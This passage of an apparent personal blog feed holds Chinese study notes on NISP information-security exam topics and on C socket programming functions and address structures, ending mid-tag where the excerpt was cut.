id="Bell－LaPadula-BLP-模型"><a href="#Bell－LaPadula-BLP-模型" class="headerlink" title="Bell－LaPadula(BLP)模型"></a>Bell－LaPadula(BLP)模型</h4><p>下读、上写</p><p>保证机密性</p><h4 id="Biba模型"><a href="#Biba模型" class="headerlink" title="Biba模型"></a>Biba模型</h4><p>上读、下写</p><p>保证完整性</p><h2 id="威胁"><a href="#威胁" class="headerlink" title="威胁"></a>威胁</h2><h4 id="安全威胁情报基本特征"><a href="#安全威胁情报基本特征" class="headerlink" title="安全威胁情报基本特征"></a>安全威胁情报基本特征</h4><ul><li>时效性</li><li>相关性</li><li>准确性</li></ul><h2 id="信息技术安全性评估通用标准"><a href="#信息技术安全性评估通用标准" class="headerlink" title="信息技术安全性评估通用标准"></a>信息技术安全性评估通用标准</h2><p>也称为CC 标准</p><h2 id="网络安全态势"><a href="#网络安全态势" class="headerlink" title="网络安全态势"></a>网络安全态势</h2><h4 id="网络安全态势感知三个层次"><a href="#网络安全态势感知三个层次" class="headerlink" title="网络安全态势感知三个层次"></a>网络安全态势感知三个层次</h4><p>感知、理解、预测</p><h4 id="网络安全态势的预测方法"><a href="#网络安全态势的预测方法" class="headerlink" title="网络安全态势的预测方法"></a>网络安全态势的预测方法</h4><p>神经网络是目前最常用的网络态势预测方法</p><h2 id="质量管理"><a href="#质量管理" class="headerlink" title="质量管理"></a>质量管理</h2><h4 id="PDCA-循环的含义是将质量管理分为四个阶段"><a href="#PDCA-循环的含义是将质量管理分为四个阶段" class="headerlink" title="PDCA 循环的含义是将质量管理分为四个阶段"></a>PDCA 循环的含义是将<strong>质量管理</strong>分为四个阶段</h4><p>计划（plan）、执行（do）、检查 （check）、处理（Act）</p><h2 id="信息系统安全运营"><a href="#信息系统安全运营" class="headerlink" title="信息系统安全运营"></a>信息系统安全运营</h2><h4 id="PDRR-安全模型"><a href="#PDRR-安全模型" class="headerlink" title="PDRR 安全模型"></a>PDRR 安全模型</h4><ul><li><p>PDRR 模型包括防护（Protection）、 检测（Detection）、响应（Reaction）和恢复（Recovery）四个部分</p></li><li><p>PDRR 是一个动态的信息系统安全运营模型</p></li><li><p>PDRR 模型中，检测部分的功能就是检测入侵者的身份</p></li><li><p>除PDRR模型之外，还有==WPDRRC 模型==、==PPDR 模型==等都是信息系统安全运营模型</p></li></ul><h2 id="信息安全防护框架"><a href="#信息安全防护框架" class="headerlink" title="信息安全防护框架"></a>信息安全防护框架</h2><ul><li>网络层安全管控：最下方；网络安全域控制，网络准入控制，网络流量分析及监测</li><li>虚拟层安全管控</li><li>系统层安全管控</li><li>应用层安全管控</li><li>数据层安全管控</li><li>用户层安全管控：最上方</li></ul><h2 id="信息系统安全防护体系建设"><a href="#信息系统安全防护体系建设" class="headerlink" title="信息系统安全防护体系建设"></a>信息系统安全防护体系建设</h2><ul><li>确定安全域是企业信息系统安全防护体系建设的首要任务</li><li>划分安全域可以设立清晰的防护边界对系统进行保护</li><li>划分安全域前需要确定企业信息系统安全防护体系的防护范围</li><li>==可以==将相同安全防护需求的对象划分到同一个安全域</li></ul><h2 id="安全策略设计原则"><a href="#安全策略设计原则" class="headerlink" title="安全策略设计原则"></a>安全策略设计原则</h2><ul><li>先急后缓</li><li>先众后寡</li><li>先端后网</li></ul><h2 id="数据融合层次"><a href="#数据融合层次" class="headerlink" title="数据融合层次"></a>数据融合层次</h2><ul><li>原始数据融合</li><li>特征级融合</li><li>决策级融合</li></ul><h2 id="网络取证-network-forensics"><a href="#网络取证-network-forensics" class="headerlink" title="网络取证(network forensics)"></a>网络取证(network forensics)</h2><p>抓取、记录和分析网络事件以发现安全攻击或其他的问题事件的来源</p><h4 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h4><p>动态、实时、多态</p><h4 id="分类方式"><a href="#分类方式" class="headerlink" title="分类方式"></a>分类方式</h4><ul><li>按照采集方式进行分类</li><li>按照取证时延性进行分类</li><li>按照不同的视角进行分类</li></ul><h4 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h4><ul><li>客观性</li><li>关联性</li><li>合法性</li></ul><h1 id="不同语言的代码规范"><a href="#不同语言的代码规范" class="headerlink" title="不同语言的代码规范"></a>不同语言的代码规范</h1><h4 id="PHP-安全编码规范"><a href="#PHP-安全编码规范" class="headerlink" title="PHP 安全编码规范"></a>PHP 安全编码规范</h4><ul><li>在 PHP 中，可以直接使用“0/1”代替“true/false”</li><li>在 PHP 项目中，“/scripts”路径下默认存放图片文件</li><li>在 PHP 项目中，可以将独立的功能模块写成函数</li></ul><h4 id="python规范"><a href="#python规范" class="headerlink" title="python规范"></a>python规范</h4><p>默认编码格式：utf-8</p><h1 id="软件安全"><a href="#软件安全" class="headerlink" title="软件安全"></a>软件安全</h1><h2 id="安全设计原则"><a href="#安全设计原则" class="headerlink" title="安全设计原则"></a>安全设计原则</h2><ul><li>最小特权原则</li><li>简单原则</li><li>纵深防御原则</li></ul><h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><ul><li>行为型模式</li><li>结构型模式：组合模式、桥接模式、代理模式</li><li>创建型模式</li></ul><h2 id="软件安全性测试"><a href="#软件安全性测试" class="headerlink" title="软件安全性测试"></a>软件安全性测试</h2><ul><li><p>狭义的软件安全测试是执行安全测试用例的过程；</p></li><li><p>广义的软件安全测试是所有关于安全性测试的活动</p></li></ul><h4 id="终端软件加固包含哪种方式？"><a href="#终端软件加固包含哪种方式？" class="headerlink" title="终端软件加固包含哪种方式？"></a>终端软件加固包含哪种方式？</h4><p>终端软件加壳、代码混淆、反动态调试</p><h4 id="软件静态分析技术"><a href="#软件静态分析技术" class="headerlink" title="软件静态分析技术"></a>软件静态分析技术</h4><p>污点分析、数据流分析、语义分析</p><h4 id="软件动态分析技术"><a href="#软件动态分析技术" class="headerlink" title="软件动态分析技术"></a>软件动态分析技术</h4><p>符号执行、Fuzz 分析、沙箱技术</p><h2 id="网络安全事件的分类分级标准"><a href="#网络安全事件的分类分级标准" class="headerlink" title="网络安全事件的分类分级标准"></a>网络安全事件的分类分级标准</h2><p>1为最大、4为最小</p><h1 id="六、单词全称"><a href="#六、单词全称" class="headerlink" title="六、单词全称"></a>六、单词全称</h1><h3 id="DDos"><a href="#DDos" class="headerlink" title="DDos"></a>DDos</h3><p>Distributed Denial of Service</p><h4 id="PPP-协议-1"><a href="#PPP-协议-1" class="headerlink" title="PPP 协议"></a>PPP 协议</h4><p>提供了中在点到点链路上封装网络层协议信息的标准方法，其英文是</p><p>The Point-to-Point Protocol</p><h4 id="消息认证码MAC"><a href="#消息认证码MAC" class="headerlink" title="消息认证码MAC"></a>消息认证码MAC</h4><p>消息内容和秘密钥的公开函数，其英文全称是</p><p>Message Authentication Code</p><h4 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h4><p>Virtual Private Network</p><h4 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h4><p>TCP/IP协议簇的一个应用层协议</p><p>Simple Network Management Protocol</p><h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><p>专为远程登录会话和其他网络服务提供安全性的协议</p><p>Secure Shell</p><h4 id="SDU"><a href="#SDU" class="headerlink" title="SDU"></a>SDU</h4><p>Service Data Unit   相邻层间交换的数据单元称之为服务数据单元</p><h4 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h4><p>Lightweight Directory Access Protocol    <strong>轻量目录访问协议</strong></p><p>AD（微软的 Active Directory） 是基于 LDAP 协议的一套解决方案（LDAP 服务器 + 应用），解决了细粒度的权限控制。核心：<strong>「谁 以什么权限 访问什么」</strong>。</p><h4 id="关于远程服务器漏洞和本地漏洞"><a href="#关于远程服务器漏洞和本地漏洞" class="headerlink" title="关于远程服务器漏洞和本地漏洞"></a>关于远程服务器漏洞和本地漏洞</h4><ul><li>本地漏洞指的是必须登录到安装软件的计算机上才能利用的漏洞</li></ul><h4 id="网络监听"><a href="#网络监听" class="headerlink" title="网络监听"></a>网络监听</h4><p>网络监听是一种监视网络状态、数据流程以及网络上信息传输的管理工具，它可以将网络界面设定成监听模式，并且可以截获网络上所传输的信息</p><ul><li>通过向网络监听组件发送含有异常数据的包，有可能触发缓冲区溢出</li><li>绕过网络监听组件身份验证，可能可以获得合法数据库账号和密码</li><li>网络监听组件被触发缓冲区重写，可能导致数据库服务器无法响应客户端</li></ul><h4 id="路由器在两个网段之间转发数据包时，读取其中的-目标IP-地址来确定下一跳的转发路径"><a href="#路由器在两个网段之间转发数据包时，读取其中的-目标IP-地址来确定下一跳的转发路径" class="headerlink" title="路由器在两个网段之间转发数据包时，读取其中的==目标IP==地址来确定下一跳的转发路径"></a>路由器在两个网段之间转发数据包时，读取其中的==目标IP==地址来确定下一跳的转发路径</h4><h3 id><a href="#" class="headerlink" title></a></h3><h4 id="数据报操作特点"><a href="#数据报操作特点" class="headerlink" title="数据报操作特点"></a>数据报操作特点</h4><ul><li>每个分组自身携带有足够的信息，它的传送是被单独处理的</li><li>在整个传送过程中，不需建立虚电路</li><li>网络节点要为每个分组做出路由选择</li></ul><h1 id="七、计算机相关"><a href="#七、计算机相关" class="headerlink" title="七、计算机相关"></a>七、计算机相关</h1><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h4 id="操作系统的管理功能"><a href="#操作系统的管理功能" class="headerlink" title="操作系统的管理功能"></a>操作系统的管理功能</h4><p>包括</p><ul><li>作业管理</li><li>文件管理</li><li>进程与处理机管理</li></ul><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h4 id="关系数据库"><a href="#关系数据库" class="headerlink" title="关系数据库"></a>关系数据库</h4><p>关系模型的数据操纵主要包括查询、插入、删除和更新数据，这些操作必须满足关系的完整性约束条件</p><ul><li>实体完整性</li><li>参照完整性</li><li>用户定义完整性</li></ul><h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><h4 id="UNIX-Linux-系统日志子系统"><a href="#UNIX-Linux-系统日志子系统" class="headerlink" title="UNIX/Linux 系统日志子系统"></a>UNIX/Linux 系统日志子系统</h4><ul><li>登录时间日志子系统</li><li>进程统计日志子系统</li><li>错误日志子系统</li><li>==没有==漏洞扫描日志子系统</li></ul><h4 id="Windows-系统日志文件"><a href="#Windows-系统日志文件" class="headerlink" title="Windows 系统日志文件"></a>Windows 系统日志文件</h4><ul><li>系统日志</li><li>应用程序日志</li><li>安全日志</li></ul><h4 id="Syslog"><a href="#Syslog" class="headerlink" title="Syslog"></a>Syslog</h4><ul><li>它是一种工业标准的协议</li><li>它分为客户端和服务器端</li><li>它是一个在 IP 网络中转发系统日志信息的标准</li></ul><h2 id="网络服务"><a href="#网络服务" class="headerlink" title="网络服务"></a>网络服务</h2><p>QoS（Quality of Service，服务质量）指一个网络能够利用各种基础技术，为指定的网络通信提供更好的服务能力。</p><h4 id="网络抖动"><a href="#网络抖动" class="headerlink" title="网络抖动"></a>网络抖动</h4><p>网上说法是指网络中的延迟是指信息从发送到接收经过的延迟时间，一般由传输延迟及处理延迟组成；<br>而抖动是指最大延迟与最小延迟的时间差，如最大延迟是20毫秒，最小延迟为5毫秒，那么网络抖动就是15毫秒，<br>它主要标识一个网络的稳定性。</p><h4 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h4><p>网络中的时延是由节点<strong>处理时延</strong>、<strong>排队时延</strong>、<strong>传输时延</strong>、<strong>传播时延</strong>几个不同部分组成的。</p><img src="/2022/03/21/019nisp%E8%AF%81%E4%B9%A6%E4%B8%80%E7%BA%A7/image-20220310083133504-16478781450928.png" class title="image-20220310083133504"><h4 id="系统的可维护性是指系统维护的难易程度，可以使用-平均维修时间-进行评价"><a href="#系统的可维护性是指系统维护的难易程度，可以使用-平均维修时间-进行评价" class="headerlink" title="系统的可维护性是指系统维护的难易程度，可以使用==平均维修时间==进行评价"></a>系统的可维护性是指系统维护的难易程度，可以使用==平均维修时间==进行评价</h4><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><p>目的是分析算法的效率以求改进</p><h4 id="S-MIME在RSA数据安全性的基础上加强了互联网E-Mail格式标准MIME的安全性"><a href="#S-MIME在RSA数据安全性的基础上加强了互联网E-Mail格式标准MIME的安全性" class="headerlink" title="S/MIME在RSA数据安全性的基础上加强了互联网E-Mail格式标准MIME的安全性"></a>S/MIME在RSA数据安全性的基础上加强了互联网E-Mail格式标准MIME的安全性</h4><ul><li>封装数据</li><li>透明签名数据</li><li>签名并封装数据</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、信息安全&quot;&gt;&lt;a href=&quot;#一、信息安全&quot; class=&quot;headerlink&quot; title=&quot;一、信息安全&quot;&gt;&lt;/a&gt;一、信息安全&lt;/h1&gt;&lt;h2 id=&quot;基本目标&quot;&gt;&lt;a href=&quot;#基本目标&quot; class=&quot;headerlink&quot; title=&quot;基</summary>
      
    
    
    
    <category term="学习" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="nisp" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/nisp/"/>
    
    
    <category term="学习" scheme="https://thanyi.github.io/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>C语言socket相关函数</title>
    <link href="https://thanyi.github.io/2021/10/10/018C%E8%AF%AD%E8%A8%80socket%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0/"/>
    <id>https://thanyi.github.io/2021/10/10/018C%E8%AF%AD%E8%A8%80socket%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0/</id>
    <published>2021-10-10T07:09:32.000Z</published>
    <updated>2022-03-21T16:15:25.656Z</updated>
    
    <content type="html"><![CDATA[<p>网络编程中的一些函数的具体用法</p><h1 id="socket创建过程的一些函数"><a href="#socket创建过程的一些函数" class="headerlink" title="socket创建过程的一些函数"></a>socket创建过程的一些函数</h1><h2 id="套接字创建函数"><a href="#套接字创建函数" class="headerlink" title="套接字创建函数"></a>套接字创建函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>; <span class="comment">//函数原型</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (<span class="number">-1</span>==(listend=socket(AF_INET,SOCK_STREAM,<span class="number">0</span>)))</span><br><span class="line"> &#123;</span><br><span class="line"> perror(<span class="string">&quot;create listen socket error\n&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>创建套接字，成功时返回文件描述符，失败时返回-1</p><h2 id="绑定函数"><a href="#绑定函数" class="headerlink" title="绑定函数"></a>绑定函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *myaddr, <span class="keyword">socklen_t</span> addrlen)</span></span>; <span class="comment">//函数原型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">-1</span>==bind(listend,(struct sockaddr *)&amp;server,<span class="keyword">sizeof</span>(struct sockaddr))) <span class="comment">//server是事先定义好了的</span></span><br><span class="line">&#123;</span><br><span class="line">    perror(<span class="string">&quot;bind error\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125; <span class="comment">//例子</span></span><br></pre></td></tr></table></figure><p>调用bind函数给套接字分配IP地址和端口，成功时返回0，失败时返回-1</p><p>也就是说这个是自己给自己的绑定</p><h2 id="监听函数"><a href="#监听函数" class="headerlink" title="监听函数"></a>监听函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (<span class="number">-1</span>==listen(listend,<span class="number">5</span>))  <span class="comment">//listend是一个套接字</span></span><br><span class="line"> &#123;</span><br><span class="line">perror(<span class="string">&quot;listen error\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>将套接字转化为可接收连接的状态，成功时返回0，失败时返回-1</p><h2 id="接收函数"><a href="#接收函数" class="headerlink" title="接收函数"></a>接收函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *addr, <span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">-1</span>==(connectd=accept(listend,(struct sockaddr*)&amp;client,&amp;len)))</span><br><span class="line">&#123;</span><br><span class="line">    perror(<span class="string">&quot;create connect socket error\n&quot;</span>);</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h2><ol><li><p>调用socket函数创建套接字</p></li><li><p>调用bind函数分配IP地址和端口号</p></li><li><p>调用listen函数转为可接收请求状态</p></li><li><p>调用accept函数受理连接请求（accept函数会再返回一个套接字）</p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20211010113502.png"></p></li></ol><h1 id="读写过程中的函数"><a href="#读写过程中的函数" class="headerlink" title="读写过程中的函数"></a>读写过程中的函数</h1><p>虽然说是两组分别用在不同操作系统的函数，但实际上来说，几乎是都可以用的</p><h2 id="read函数和write函数（听说大多数用在linux）"><a href="#read函数和write函数（听说大多数用在linux）" class="headerlink" title="read函数和write函数（听说大多数用在linux）"></a>read函数和write函数（听说大多数用在linux）</h2><h3 id="read函数"><a href="#read函数" class="headerlink" title="read函数"></a>read函数</h3><p>函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include &lt;unistd.h&gt;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read</span><span class="params">(inf fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> bnytes)</span></span>;<span class="comment">//成功时返回接收的字节数（但遇到文件结尾则返回0），失败时返回-1</span></span><br></pre></td></tr></table></figure><ul><li>fd：显示数据接收对象的文件描述符</li><li>buf：要保存接收数据的缓冲地址值</li><li>nbytes：要接收数据的最大字节数</li></ul><h3 id="write函数"><a href="#write函数" class="headerlink" title="write函数"></a>write函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>fd：显示数据接收对象的文件描述符</li><li>buf：要保存接收数据的缓冲地址值</li><li>nbytes：要接收数据的最大字节数</li></ul><h2 id="recv函数和send函数（大多数用在windows）"><a href="#recv函数和send函数（大多数用在windows）" class="headerlink" title="recv函数和send函数（大多数用在windows）"></a>recv函数和send函数（大多数用在windows）</h2><h3 id="recv函数"><a href="#recv函数" class="headerlink" title="recv函数"></a>recv函数</h3><p>recv和read相似，都可用来接收sockfd发送的数据，但recv比read多了一个参数，也就是第四个参数，它可以指定标志来控制如何接收数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recv</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> nbytes, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span>&gt;(recvnum = recv(connectd,recv_buf,<span class="keyword">sizeof</span>(recv_buf),<span class="number">0</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">    perror(<span class="string">&quot;recv error\n&quot;</span>);</span><br><span class="line">    close(connectd);</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">recv_buf[recvnum]=<span class="string">&#x27;\0&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="send函数"><a href="#send函数" class="headerlink" title="send函数"></a>send函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">send</span><span class="params">(SOCKET sock, <span class="keyword">const</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span>&gt;send(sockfd,send_buf,<span class="keyword">sizeof</span>(send_buf),<span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    perror(<span class="string">&quot;error occar in sending data\n&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="其他小tips"><a href="#其他小tips" class="headerlink" title="其他小tips"></a>其他小tips</h1><h2 id="ssize-t和size-t数据类型"><a href="#ssize-t和size-t数据类型" class="headerlink" title="ssize_t和size_t数据类型"></a>ssize_t和size_t数据类型</h2><ul><li>ssize_t是有符号整型，在32位机器上等同与int，在64位机器上等同与long int</li></ul><p>几乎没有什么区别，就是一个整型变量</p><ul><li>size_t 就是无符号型的ssize_t，也就是unsigned long/ unsigned int (在32位下）<ul><li>size_t的正确定义应该是typedef unsigned long size_t。</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;网络编程中的一些函数的具体用法&lt;/p&gt;
&lt;h1 id=&quot;socket创建过程的一些函数&quot;&gt;&lt;a href=&quot;#socket创建过程的一些函数&quot; class=&quot;headerlink&quot; title=&quot;socket创建过程的一些函数&quot;&gt;&lt;/a&gt;socket创建过程的一些函数&lt;/h</summary>
      
    
    
    
    <category term="学习" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="学习笔记" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习" scheme="https://thanyi.github.io/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>C语言网络编程中几个结构体的用法</title>
    <link href="https://thanyi.github.io/2021/10/09/017c%E8%AF%AD%E8%A8%80%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E4%B8%AD%E5%87%A0%E4%B8%AA%E7%BB%93%E6%9E%84%E4%BD%93%E7%9A%84%E7%94%A8%E6%B3%95/"/>
    <id>https://thanyi.github.io/2021/10/09/017c%E8%AF%AD%E8%A8%80%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E4%B8%AD%E5%87%A0%E4%B8%AA%E7%BB%93%E6%9E%84%E4%BD%93%E7%9A%84%E7%94%A8%E6%B3%95/</id>
    <published>2021-10-09T15:25:17.000Z</published>
    <updated>2021-10-08T16:29:54.314Z</updated>
    
    <content type="html"><![CDATA[<p>C语言网络编程中有很多结构体，其中很多的结构体对我来说很混乱，难以记住，想要先整理一下</p><h1 id="用来处理网络通信的地址"><a href="#用来处理网络通信的地址" class="headerlink" title="用来处理网络通信的地址"></a>用来处理网络通信的地址</h1><h2 id="struct-sockaddr"><a href="#struct-sockaddr" class="headerlink" title="struct sockaddr"></a>struct sockaddr</h2><p>sockaddr在头文件<code>#include &lt;sys/socket.h&gt;</code>中定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> sa_family;  <span class="comment">/* 地址族, AF_xxx */</span></span><br><span class="line">    <span class="keyword">char</span> sa_data[<span class="number">14</span>];  <span class="comment">/* 14字节的协议地址*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="struct-sockaddr-in"><a href="#struct-sockaddr-in" class="headerlink" title="struct sockaddr_in"></a>struct sockaddr_in</h2><p>sockaddr_in在头文件<code>#include&lt;netinet/in.h&gt;或#include &lt;arpa/inet.h&gt;</code>中定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="keyword">short</span> <span class="keyword">int</span> sin_family; <span class="comment">/* 地址族 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> sin_port; <span class="comment">/* 端口号 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span> <span class="comment">/* Internet地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> sin_zero[<span class="number">8</span>]; <span class="comment">/* 与struct sockaddr一样的长度 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="in-addr"><a href="#in-addr" class="headerlink" title="in_addr"></a>in_addr</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> s_addr;   <span class="comment">//32位ipv4的地址</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是个32位的ip地址，应该是用的16进制进行表示，比如说192.168.0.1就是（0xC0A80001）</p><h2 id="sockaddr和sockaddr-in的区别"><a href="#sockaddr和sockaddr-in的区别" class="headerlink" title="sockaddr和sockaddr_in的区别"></a>sockaddr和sockaddr_in的区别</h2><p>sockaddr常用于bind、connect、recvfrom、sendto等函数的参数，指明地址信息，是一种通用的套接字地址。</p><p>sockaddr_in 是internet环境下套接字的地址形式。所以在网络编程中我们会对sockaddr_in结构体进行操作，使用sockaddr_in来建立所需的信息，最后使用类型转化就可以了。一般先把sockaddr_in变量赋值后，强制类型转换后传入用sockaddr做参数的函数：sockaddr_in用于socket定义和赋值；</p><h1 id="其他相关函数"><a href="#其他相关函数" class="headerlink" title="其他相关函数"></a>其他相关函数</h1><h2 id="htons-和-inet-addr"><a href="#htons-和-inet-addr" class="headerlink" title="htons() 和 inet_addr()"></a>htons() 和 inet_addr()</h2><p>htons()作用是将端口号由主机字节序转换为网络字节序的整数值。(host to net)（都是简写还挺好记的）</p><p>inet_addr()作用是将一个IP字符串转化为一个网络字节序的整数值，用于sockaddr_in.sin_addr.s_addr。</p><h2 id="inet-ntoa"><a href="#inet-ntoa" class="headerlink" title="inet_ntoa()"></a>inet_ntoa()</h2><p>将一个sin_addr结构体输出成IP字符串(network to ascii)。</p><h1 id="给socket赋值的方法"><a href="#给socket赋值的方法" class="headerlink" title="给socket赋值的方法"></a>给socket赋值的方法</h1><h2 id="给地址赋值"><a href="#给地址赋值" class="headerlink" title="给地址赋值"></a>给地址赋值</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span 